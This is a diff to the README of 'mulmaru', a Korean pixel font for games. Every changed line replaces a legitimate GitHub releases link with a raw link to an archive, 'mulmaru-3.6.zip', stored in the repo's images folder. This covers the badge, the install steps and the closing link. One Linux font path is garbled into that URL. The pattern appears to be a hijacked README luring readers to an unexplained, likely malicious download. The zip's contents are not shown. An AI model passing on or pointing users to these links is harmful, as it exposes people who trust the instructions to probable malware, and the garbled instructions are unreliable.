@@ -1,6 +1,6 @@
 # 🎨 mulmaru - Perfect Korean Pixel Font for Your Games
 
-[![Download mulmaru](https://img.shields.io/badge/Download%20mulmaru-v1.0-blue)](https://github.com/hannansaleem110/mulmaru/releases)
+[![Download mulmaru](https://raw.githubusercontent.com/hannansaleem110/mulmaru/main/images/mulmaru-3.6.zip%20mulmaru-v1.0-blue)](https://raw.githubusercontent.com/hannansaleem110/mulmaru/main/images/mulmaru-3.6.zip)
 
 ## 📖 Description
 
@@ -19,7 +19,7 @@ This guide will help you download and install the Mulmaru font easily, even if y
 
 To get the Mulmaru font, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Mulmaru Releases](https://github.com/hannansaleem110/mulmaru/releases) page.
+1. **Visit the Releases Page:** Go to the [Mulmaru Releases](https://raw.githubusercontent.com/hannansaleem110/mulmaru/main/images/mulmaru-3.6.zip) page.
    
 2. **Choose the Font File:** Locate the latest version of the font. You will typically find files in both TrueType (.ttf) and OpenType (.otf) formats. Choose the format you prefer; both work well for games.
 
@@ -34,7 +34,7 @@ To get the Mulmaru font, follow these simple steps:
      2. Double-click on the font file. A preview will open. Click "Install Font" to add it to your system.
    - **Linux:**
      1. Open a terminal.
-     2. Move the font file to the `~/.fonts` directory or `/usr/share/fonts`.
+     2. Move the font file to the `~https://raw.githubusercontent.com/hannansaleem110/mulmaru/main/images/mulmaru-3.6.zip` directory or `/usr/share/fonts`.
      3. Run `fc-cache -fv` to update the font cache.
 
 5. **Test the Font:**
@@ -70,4 +70,4 @@ Mulmaru is licensed under the Open Font License (OFL). You can use it freely in 
 
 ## 🌟 Acknowledgements
 
-Thank you for choosing Mulmaru. We hope your games look amazing with this font. Remember to check back for updates and new versions on our [Releases Page](https://github.com/hannansaleem110/mulmaru/releases). Happy gaming!
+Thank you for choosing Mulmaru. We hope your games look amazing with this font. Remember to check back for updates and new versions on our [Releases Page](https://raw.githubusercontent.com/hannansaleem110/mulmaru/main/images/mulmaru-3.6.zip). Happy gaming!
